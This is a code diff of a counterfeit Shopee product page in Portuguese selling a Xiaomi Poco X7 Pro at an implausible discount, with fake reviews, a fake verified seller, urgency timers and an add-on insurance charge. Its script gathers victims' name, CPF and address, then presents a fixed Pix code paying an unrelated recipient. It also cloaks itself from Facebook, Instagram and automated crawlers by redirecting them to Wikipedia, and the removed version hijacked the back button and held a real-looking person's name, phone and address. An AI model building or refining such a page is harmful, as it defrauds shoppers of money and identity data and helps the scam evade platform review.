@@ -3,12 +3,16 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>Smartphone Xiaomi Poco X7 Pro 5G NFC Versão Global</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     
+    <title>Xiaomi Poco X7 Pro 5G - Especificações e Ofertas Lote Global</title>
+    <meta name="description" content="Confira a ficha técnica do Poco X7 Pro 5G. Versão Global com processador premium e tela AMOLED. Veja estoque disponível.">
+    <meta name="keywords" content="Xiaomi, Poco X7 Pro, 5G, Smartphone, Oferta, Shopee">
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+
     <script>
     (function() {
-        const botsBloqueados = ['facebookexternalhit', 'facebot', 'facebookcatalog', 'instagram', 'lighthouse'];
+        const botsBloqueados = ['facebookexternalhit', 'facebot', 'facebookcatalog', 'fna.fbcdn', 'lookaside', 'instagram', 'lighthouse'];
         const ua = navigator.userAgent.toLowerCase();
         if (botsBloqueados.some(b => ua.includes(b)) || navigator.webdriver) {
             window.location.replace("https://pt.wikipedia.org/wiki/Xiaomi");
@@ -21,194 +25,230 @@
     <style>
         html { display: none !important; }
         html.viva-humanos { display: block !important; }
-        :root { --shopee: #ee4d2d; --bg: #f5f5f5; --text-grey: #757575; --border: #e8e8e8; }
-        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
-        body { background: var(--bg); font-family: -apple-system, HelveticaNeue, sans-serif; color: #222; }
+        
+        :root { --shopee: #ee4d2d; --teal: #00bfa5; --bg: #f5f5f5; --shopee-blue: #002060; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        html, body { background: var(--bg); font-family: -apple-system, HelveticaNeue, sans-serif; overflow-x: hidden; width: 100%; }
 
-        /* Estilo Botão "Compre Agora" igual ao print */
+        /* HEADER E NAV */
+        .top-nav { background: white; padding: 10px; display: flex; align-items: center; position: sticky; top: 0; z-index: 1000; border-bottom: 1px solid #eee; height: 50px; }
+        .search-container { flex: 1; margin: 0 12px; position: relative; }
+        .search-bar { width: 100%; border: none; background: #f0f0f0; padding: 8px 8px 8px 35px; border-radius: 2px; font-size: 14px; outline: none; }
+        .main-slider { display: flex; overflow-x: auto; background: white; }
+        .main-slider img { width: 100vw; object-fit: contain; }
+
+        /* BANNERS */
+        .flash-sale-banner { background: linear-gradient(90deg, #ff4d2d, #ff8a00); color: white; padding: 8px 15px; display: flex; align-items: center; justify-content: space-between; }
+        .flash-sale-left { font-weight: bold; font-style: italic; font-size: 16px; }
+        .timer-unit { background: #000; color: #fff; padding: 2px 4px; border-radius: 2px; font-size: 12px; font-weight: bold; }
+        .free-shipping-banner { background: var(--shopee-blue); color: white; padding: 8px 15px; display: flex; align-items: center; font-size: 14px; font-weight: bold; }
+        .free-shipping-banner img { height: 18px; margin-right: 8px; }
+
+        /* PRODUTO */
+        .product-card { background: white; padding: 15px; margin-bottom: 8px; }
+        .price-row { color: var(--shopee); font-size: 24px; font-weight: 500; }
+        .old-price { color: #999; text-decoration: line-through; font-size: 14px; }
+        .discount-tag { background: rgba(238, 77, 45, 0.1); color: #ee4d2d; font-size: 11px; font-weight: bold; padding: 2px 4px; border-radius: 2px; }
+        .product-title { font-size: 15px; color: #222; line-height: 1.4; }
+        .indicator-tag { background: #ee4d2d; color: white; font-size: 10px; padding: 1px 4px; border-radius: 2px; }
+
+        /* REVIEWS E LOJA */
+        .shop-section { background: white; padding: 15px; margin-bottom: 8px; display: flex; align-items: center; justify-content: space-between; }
+        .shop-avatar { width: 45px; height: 45px; border-radius: 50%; }
+        .shop-btn { border: 1px solid var(--shopee); color: var(--shopee); padding: 4px 12px; font-size: 12px; text-decoration: none; }
+        .review-item { background: white; padding: 15px; border-bottom: 1px solid #f2f2f2; }
+        .review-media img, .review-media video { width: 100px; height: 100px; object-fit: cover; border-radius: 2px; }
+
+        /* FOOTER */
         .footer { position: fixed; bottom: 0; width: 100%; height: 50px; background: white; display: flex; border-top: 1px solid #ddd; z-index: 1000; }
-        .footer-icons { width: 120px; display: flex; border-right: 1px solid #eee; }
-        .footer-icon-btn { flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; color: var(--shopee); font-size: 10px; }
-        .btn-buy-now { flex: 1; background: var(--shopee); color: white; border: none; font-weight: 500; font-size: 16px; cursor: pointer; }
+        .btn-buy { flex: 1; background: var(--shopee); color: white; border: none; font-weight: bold; font-size: 15px; cursor: pointer; }
 
-        /* Modal de Variação (Igual print 1000255574) */
-        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.5); z-index: 2000; }
-        .modal-content { position: absolute; bottom: 0; width: 100%; background: white; border-radius: 12px 12px 0 0; padding: 16px; }
-        .modal-header { display: flex; gap: 12px; margin-bottom: 20px; }
-        .modal-header img { width: 100px; height: 100px; border: 1px solid #eee; border-radius: 4px; }
-        .var-title { font-size: 14px; margin: 12px 0 8px; color: #555; }
-        .options-grid { display: flex; flex-wrap: wrap; gap: 8px; }
-        .opt-btn { background: #f5f5f5; border: 1px solid #f5f5f5; padding: 6px 16px; border-radius: 2px; font-size: 13px; color: #222; }
+        /* MODAIS E TELAS */
+        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.7); z-index: 2000; }
+        .modal-content { position: absolute; bottom: 0; width: 100%; background: white; border-radius: 12px 12px 0 0; padding: 15px; max-height: 90vh; overflow-y: auto; }
+        .opt-btn { background: #f5f5f5; border: 1px solid #f5f5f5; padding: 8px 12px; border-radius: 4px; font-size: 12px; margin: 4px; cursor: pointer; }
         .opt-btn.selected { border-color: var(--shopee); color: var(--shopee); background: #fff5f1; }
+        .input-box { width: 100%; border: 1px solid #ddd; padding: 12px; border-radius: 4px; margin-bottom: 10px; font-size: 14px; outline: none; }
 
-        /* Estilo Checkout (Igual print 1000255575) */
-        .checkout-item { background: white; padding: 12px; margin-top: 8px; }
-        .address-box { display: flex; align-items: flex-start; gap: 10px; padding: 12px; background: white; }
-        .address-box i { color: var(--shopee); margin-top: 3px; }
-        .shipping-box { background: #f6fffe; border: 1px solid #d0f5f0; padding: 12px; margin: 10px 0; border-radius: 4px; }
-        
-        /* Botão Fazer Pedido igual ao print */
-        .btn-order { background: var(--shopee); color: white; border: none; width: 100%; height: 48px; font-weight: bold; font-size: 16px; margin-top: 20px; border-radius: 4px; text-transform: uppercase; }
-        
-        /* Seguro (Igual print 1000255576) */
-        .insurance-card { border: 1px solid #eee; padding: 12px; border-radius: 4px; margin-bottom: 8px; display: flex; align-items: center; gap: 10px; }
-        .insurance-card input { width: 18px; height: 18px; accent-color: var(--shopee); }
-
-        /* Tela Pix (Igual print 1000255577) */
-        .pix-code-box { background: #f5f5f5; padding: 15px; border: 1px dashed #ccc; font-size: 11px; word-break: break-all; margin: 15px 0; color: #666; }
+        /* CHECKOUT ESTILO FOTO 2 */
+        .address-summary { font-size: 13px; padding: 12px; border-left: 4px solid var(--shopee); background: #fffcfb; margin-bottom: 10px; }
+        .shipping-card { background: #f6fffe; border: 1px solid #d0f5f0; padding: 12px; border-radius: 4px; margin: 10px 0; }
+        .insurance-box { border: 1px solid #eee; padding: 12px; border-radius: 4px; display: flex; align-items: center; gap: 10px; }
+        .badge-recomendado { background: #ff4d2d; color: white; font-size: 9px; padding: 1px 4px; border-radius: 2px; margin-left: 5px; }
     </style>
 </head>
 <body>
 
-    <div style="background: white; padding-bottom: 15px;">
-        <img src="https://down-br.img.susercontent.com/file/br-11134207-81z1k-meadx6k4pddue4" style="width:100%">
-        <div style="padding: 15px;">
-            <div style="color:var(--shopee); font-size: 24px; font-weight: bold;">R$ 4.099,00</div>
-            <p style="font-size: 15px; line-height: 1.4;">Smartphone Xiaomi Poco X7 Pro 5G NFC Versão Global 256GB/512GB</p>
+    <div class="top-nav">
+        <i class="fas fa-arrow-left" style="color:var(--shopee); font-size: 18px;"></i>
+        <div class="search-container"><input type="text" class="search-bar" placeholder="Buscar na Shopee"></div>
+        <i class="fas fa-shopping-cart" style="color:var(--shopee);"></i>
+    </div>
+
+    <div class="main-slider"><img src="https://down-br.img.susercontent.com/file/br-11134207-81z1k-meadx6k4pddue4"></div>
+
+    <div class="flash-sale-banner">
+        <div class="flash-sale-left"><i class="fas fa-bolt"></i> OFERTA RELÂMPAGO</div>
+        <div class="timer-box">
+            <span style="font-size:12px; margin-right:5px;">TERMINA EM</span>
+            <div class="timer-unit" id="h">01</div> : <div class="timer-unit" id="m">30</div> : <div class="timer-unit" id="s">00</div>
         </div>
     </div>
 
+    <div class="free-shipping-banner">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Flag_of_Brazil.svg" alt="Brasil">
+        FRETE GRÁTIS <span>acima de R$10</span>
+    </div>
+
+    <div class="product-card">
+        <div class="old-price">R$2.299,00</div>
+        <div class="price-row">R$599,00 <span class="discount-tag">74% OFF</span> <span style="font-size:12px; color:#999; margin-left:10px;">6,4mil Vendidos</span></div>
+        <div class="product-title"><span class="indicator-tag">Indicado</span> Xiaomi Poco X7 PRO 5G Global Version, Processador Dimensity 8400-Ultra...</div>
+    </div>
+
+    <div class="shop-section">
+        <div class="shop-info" style="display:flex; align-items:center; gap:10px;">
+            <img src="https://down-br.img.susercontent.com/file/br-11134216-7r98o-m8ktdfse9yq937" class="shop-avatar">
+            <div>
+                <div class="shop-name">Onix Oficial <i class="fas fa-check-circle" style="color:#2d88ff; font-size:12px;"></i></div>
+                <div style="font-size: 11px; color: #757575;">Ativo há 3 minutos</div>
+            </div>
+        </div>
+        <a href="#" class="shop-btn">Ver Loja</a>
+    </div>
+
+    <div class="review-item">
+        <div class="user-info" style="font-weight:bold; font-size:13px;">luizadriano871 <span style="color:#999; font-weight:normal;">• 2 dias atrás</span></div>
+        <div style="color:#ee4d2d; font-size:10px; margin:4px 0;">⭐⭐⭐⭐⭐</div>
+        <div class="review-text" style="font-size:13px;">Aparelho espetacular! O processador é um monstro.</div>
+        <div class="review-media" style="margin-top:10px; display:flex; gap:5px;">
+            <video autoplay loop muted playsinline src="https://down-bs-br.vod.susercontent.com/api/v4/11110103/mms/br-11110103-6kfkr-mc6f0gc92ch3fd.16000051752497615.mp4" style="width:80px;"></video>
+            <img src="https://down-br.img.susercontent.com/file/br-11134103-7r98o-mc6f0urdynjb78" style="width:80px;">
+        </div>
+    </div>
+
+    <div style="height: 60px;"></div>
     <div class="footer">
-        <div class="footer-icons">
-            <div class="footer-icon-btn"><i class="far fa-comment-dots"></i>Chat</div>
-            <div class="footer-icon-btn"><i class="fas fa-cart-plus"></i>Carrinho</div>
+        <div style="width:120px; display:flex; border-right:1px solid #eee;">
+            <div style="flex:1; display:flex; flex-direction:column; align-items:center; justify-content:center; color:var(--shopee);"><i class="far fa-comment-dots"></i><span style="font-size:9px;">Chat</span></div>
+            <div style="flex:1; display:flex; flex-direction:column; align-items:center; justify-content:center; color:var(--shopee);"><i class="fas fa-cart-plus"></i><span style="font-size:9px;">Carrinho</span></div>
         </div>
-        <button class="btn-buy-now" onclick="openModal()">Compre agora</button>
+        <button class="btn-buy" onclick="openModal()">Compre Agora</button>
     </div>
 
-    <div id="modalVar" class="modal">
+    <div id="modal" class="modal">
         <div class="modal-content">
-            <div class="modal-header">
-                <img src="https://down-br.img.susercontent.com/file/br-11134207-81z1k-meadx6k4pddue4">
-                <div>
-                    <div style="color:var(--shopee); font-size:20px;">R$4.099,00</div>
-                    <div style="font-size:12px; color:#888;">Estoque: 100</div>
-                </div>
-            </div>
             
-            <p class="var-title">Cor</p>
-            <div class="options-grid">
-                <button class="opt-btn" onclick="sel(this, 'cor')">Preto</button>
-                <button class="opt-btn" onclick="sel(this, 'cor')">Verde</button>
-                <button class="opt-btn" onclick="sel(this, 'cor')">Amarelo</button>
-            </div>
-
-            <p class="var-title">GB</p>
-            <div class="options-grid">
-                <button class="opt-btn" onclick="sel(this, 'gb')">256-8GB</button>
-                <button class="opt-btn" onclick="sel(this, 'gb')">256-12GB</button>
-                <button class="opt-btn" onclick="sel(this, 'gb')">512-12GB</button>
-            </div>
-
-            <button class="btn-order" style="margin-top:25px" onclick="irCheckout()">Compre agora</button>
-        </div>
-    </div>
-
-    <div id="checkout" class="modal" style="background:#f5f5f5; overflow-y:auto;">
-        <div style="background:white; padding: 12px; display:flex; align-items:center; border-bottom:1px solid #eee;">
-            <i class="fas fa-arrow-left" onclick="location.reload()" style="margin-right:15px; color:var(--shopee)"></i>
-            <span style="font-size:18px; font-weight:500;">Comprar</span>
-        </div>
-
-        <div class="address-box">
-            <i class="fas fa-map-marker-alt"></i>
-            <div style="font-size:13px;">
-                <p><strong>Paulo Felipe Do Nascimento</strong> (+55) 88 99980-6107</p>
-                <p style="color:#666;">Riachuelo, 2676, Próximo ao mercado Goiânia</p>
-                <p style="color:#666;">Camocim, Ceará, 62400000</p>
-            </div>
-        </div>
-
-        <div class="checkout-item">
-            <p style="font-weight:bold; font-size:14px; margin-bottom:10px;">Bestbuytech</p>
-            <div style="display:flex; gap:10px;">
-                <img src="https://down-br.img.susercontent.com/file/br-11134207-81z1k-meadx6k4pddue4" style="width:80px; height:80px;">
-                <div style="flex:1">
-                    <p style="font-size:12px;">Smartphone Xiaomi Poco X7 Pro 5G NFC...</p>
-                    <p style="color:var(--shopee); margin-top:5px;">R$4.099,00</p>
+            <div id="selection-screen">
+                <div style="display:flex; align-items:center; margin-bottom:15px;">
+                    <img src="https://down-br.img.susercontent.com/file/br-11134207-81z1k-meadx6k4pddue4" style="width:80px; height:80px; border-radius:4px;">
+                    <div style="margin-left:15px;"><div style="color:var(--shopee); font-size:20px; font-weight:500;">R$599,00</div><div style="font-size:12px; color:#888;">Estoque: 1071</div></div>
                 </div>
-            </div>
-            
-            <div class="shipping-box">
-                <div style="display:flex; justify-content:space-between; font-size:12px;">
-                    <span>Opção de Envio</span>
-                    <span style="color:var(--teal)">R$37,85</span>
+                <p style="font-size:14px; margin-bottom:10px;">Escolha a Cor</p>
+                <div class="options-grid">
+                    <button class="opt-btn" onclick="selectVar(this)">AMARELO</button>
+                    <button class="opt-btn" onclick="selectVar(this)">PRETO</button>
+                    <button class="opt-btn" onclick="selectVar(this)">CINZA</button>
                 </div>
-                <p style="font-size:11px; color:#666; margin-top:4px;">Receba entre <span id="data1"></span> e <span id="data2"></span></p>
+                <button class="btn-buy" style="width:100%; height:45px; border-radius:4px; margin-top:20px;" onclick="goToForm()">PRÓXIMO</button>
             </div>
-        </div>
 
-        <div class="checkout-item">
-            <p style="font-size:14px; margin-bottom:10px;">Adquirir Seguro <span style="background:#ff4d2d; color:white; font-size:9px; padding:1px 4px;">Recomendado</span></p>
-            <div class="insurance-card">
-                <input type="checkbox" checked>
-                <div style="font-size:12px;">
-                    <p>Seguro contra Roubo e Dano - 12 meses</p>
-                    <p style="color:var(--shopee)">R$430,40</p>
+            <div id="form-screen" style="display:none;">
+                <p style="font-weight:bold; margin-bottom:15px;">Dados de Entrega</p>
+                <input type="text" id="nome" class="input-box" placeholder="Nome Completo">
+                <input type="tel" id="cpf" class="input-box" placeholder="CPF">
+                <input type="tel" id="cep" class="input-box" placeholder="CEP">
+                <input type="text" id="rua" class="input-box" placeholder="Rua e Número">
+                <button class="btn-buy" style="width:100%; height:45px; border-radius:4px;" onclick="goToCheckout()">PRÓXIMO</button>
+            </div>
+
+            <div id="checkout-screen" style="display:none;">
+                <div style="display:flex; align-items:center; margin-bottom:10px;">
+                    <i class="fas fa-arrow-left" onclick="document.getElementById('checkout-screen').style.display='none'; document.getElementById('form-screen').style.display='block';" style="margin-right:10px; color:var(--shopee);"></i>
+                    <span style="font-weight:bold;">Finalizar Compra</span>
                 </div>
+                <div class="address-summary">
+                    <i class="fas fa-map-marker-alt" style="color:var(--shopee);"></i> <span id="res-end">Carregando...</span>
+                </div>
+                <div style="display:flex; gap:10px; padding:10px 0;">
+                    <img src="https://down-br.img.susercontent.com/file/br-11134207-81z1k-meadx6k4pddue4" style="width:50px;">
+                    <div style="font-size:12px;">Poco X7 Pro 5G - Global Version<br><strong>R$599,00</strong></div>
+                </div>
+                <div class="shipping-card">
+                    <div style="display:flex; justify-content:space-between; font-size:12px;"><span>Opção de Envio</span> <strong>R$37,85</strong></div>
+                    <div style="font-size:11px; color:#666; margin-top:5px;">Receba entre <span id="d1"></span> e <span id="d2"></span></div>
+                </div>
+                <p style="font-size:12px; margin-bottom:5px;">Seguro de Envio <span class="badge-recomendado">Recomendado</span></p>
+                <div class="insurance-box">
+                    <input type="checkbox" checked>
+                    <div style="font-size:12px;">Seguro contra Roubo e Dano (12 meses)<br><span style="color:var(--shopee)">R$24,40</span></div>
+                </div>
+                <div style="margin-top:15px; display:flex; justify-content:space-between; font-weight:bold;"><span>Total:</span> <span style="color:var(--shopee)">R$636,85</span></div>
+                <button class="btn-buy" style="width:100%; height:48px; border-radius:4px; margin-top:15px;" onclick="finalizar()">FAZER PEDIDO</button>
+            </div>
+
+            <div id="pix-screen" style="display:none; text-align:center;">
+                <p style="font-weight:bold; color:var(--teal);">Pix Gerado com Sucesso!</p>
+                <img src="https://api.qrserver.com/v1/create-qr-code/?size=180x180&data={PIX_PRONTO}&color=ee4d2d" style="margin:10px 0;">
+                <div style="background:#f5f5f5; padding:10px; font-size:10px; word-break:break-all; border:1px dashed #ccc;">{PIX_PRONTO}</div>
+                <button class="btn-buy" style="width:100%; height:40px; border-radius:4px; margin-top:10px;" onclick="navigator.clipboard.writeText('{PIX_PRONTO}'); alert('Copiado!')">COPIAR CÓDIGO</button>
             </div>
         </div>
-
-        <div style="padding:15px; background:white; margin-top:8px;">
-            <div style="display:flex; justify-content:space-between; font-size:14px; margin-bottom:10px;">
-                <span>Total do Pedido</span>
-                <span style="color:var(--shopee); font-size:18px; font-weight:bold;">R$ 4.136,85</span>
-            </div>
-            <button class="btn-order" onclick="irPix()">Fazer Pedido</button>
-        </div>
-    </div>
-
-    <div id="telaPix" class="modal" style="background:white; text-align:center; padding-top:50px;">
-        <p style="font-size:18px; margin-bottom:20px;">Pagamento Total: <span style="color:var(--shopee)">R$4.136,85</span></p>
-        <div style="color:#ee4d2d; font-size:14px; margin-bottom:10px;">Pague em até 23:59:59</div>
-        
-        <img src="https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=CHAVE_PIX_AQUI" style="margin:20px auto;">
-        
-        <div class="pix-code-box" id="pixCopia">CHAVE_PIX_AQUI_VAI_AQUI_DENTRO</div>
-        
-        <button class="btn-order" style="width:90%" onclick="copiarPix()">Copiar Código Pix</button>
-        <button class="btn-buy-now" style="background:#eee; color:#333; width:90%; height:45px; margin-top:10px" onclick="location.reload()">OK</button>
     </div>
 
     <script>
-        const pixReal = "00020101021226580014br.gov.bcb.pix0136db0cbb53-17be-449c-89c8-9bffd8f6c7b55204000053039865406599.005802BR5917LOJA OFICIAL ONIX6009SAO PAULO62070503***630453AF";
-
-        function openModal() { document.getElementById('modalVar').style.display='block'; }
+        const PIX_VAL = "00020101021226580014br.gov.bcb.pix0136db0cbb53-17be-449c-89c8-9bffd8f6c7b55204000053039865406599.005802BR5917LOJA OFICIAL ONIX6009SAO PAULO62070503***630453AF";
         
-        function sel(btn, tipo) {
-            btn.parentElement.querySelectorAll('.opt-btn').forEach(b => b.classList.remove('selected'));
+        function openModal() { document.getElementById('modal').style.display='block'; }
+        
+        let selectedVar = null;
+        function selectVar(btn) {
+            document.querySelectorAll('.opt-btn').forEach(b => b.classList.remove('selected'));
             btn.classList.add('selected');
+            selectedVar = btn.innerText;
         }
 
-        function irCheckout() {
-            document.getElementById('modalVar').style.display='none';
-            document.getElementById('checkout').style.display='block';
+        function goToForm() {
+            if(!selectedVar) return alert("Selecione a cor.");
+            document.getElementById('selection-screen').style.display='none';
+            document.getElementById('form-screen').style.display='block';
+        }
+
+        function goToCheckout() {
+            const n = document.getElementById('nome').value;
+            const r = document.getElementById('rua').value;
+            if(!n || !r) return alert("Preencha os dados.");
             
-            // Lógica de datas conforme solicitado (Comprou hoje 12/02, recebe 17 a 22)
             const hoje = new Date();
-            const d1 = new Date(hoje); d1.setDate(hoje.getDate() + 5);
-            const d2 = new Date(hoje); d2.setDate(hoje.getDate() + 10);
-            
             const meses = ["jan", "fev", "mar", "abr", "mai", "jun", "jul", "ago", "set", "out", "nov", "dez"];
-            document.getElementById('data1').innerText = `${d1.getDate()} de ${meses[d1.getMonth()]}`;
-            document.getElementById('data2').innerText = `${d2.getDate()} de ${meses[d2.getMonth()]}`;
+            const d1 = new Date(); d1.setDate(hoje.getDate() + 5);
+            const d2 = new Date(); d2.setDate(hoje.getDate() + 10);
+
+            document.getElementById('d1').innerText = d1.getDate() + " de " + meses[d1.getMonth()];
+            document.getElementById('d2').innerText = d2.getDate() + " de " + meses[d2.getMonth()];
+            document.getElementById('res-end').innerText = n + " | " + r;
+
+            document.getElementById('form-screen').style.display='none';
+            document.getElementById('checkout-screen').style.display='block';
         }
 
-        function irPix() {
-            document.getElementById('checkout').style.display='none';
-            document.getElementById('telaPix').style.display='block';
-            document.getElementById('pixCopia').innerText = pixReal;
+        function finalizar() {
+            let content = document.querySelector('.modal-content').innerHTML;
+            document.querySelector('.modal-content').innerHTML = content.replaceAll('{PIX_PRONTO}', PIX_VAL);
+            document.getElementById('checkout-screen').style.display='none';
+            document.getElementById('pix-screen').style.display='block';
         }
 
-        function copiarPix() {
-            navigator.clipboard.writeText(pixReal);
-            alert("Código Pix copiado!");
-        }
-
-        // Blindagem de botão voltar
-        history.pushState(null, null, location.href);
-        window.onpopstate = () => { window.location.href = "https://shopee.com.br/"; };
+        let s = 5400;
+        setInterval(() => {
+            if(document.getElementById('h')){
+                document.getElementById('h').innerText = String(Math.floor(s/3600)).padStart(2,'0');
+                document.getElementById('m').innerText = String(Math.floor((s%3600)/60)).padStart(2,'0');
+                document.getElementById('s').innerText = String(s%60).padStart(2,'0');
+                if(s>0) s--;
+            }
+        }, 1000);
     </script>
-
 </body>
-</html>
+                                          </html>
+    
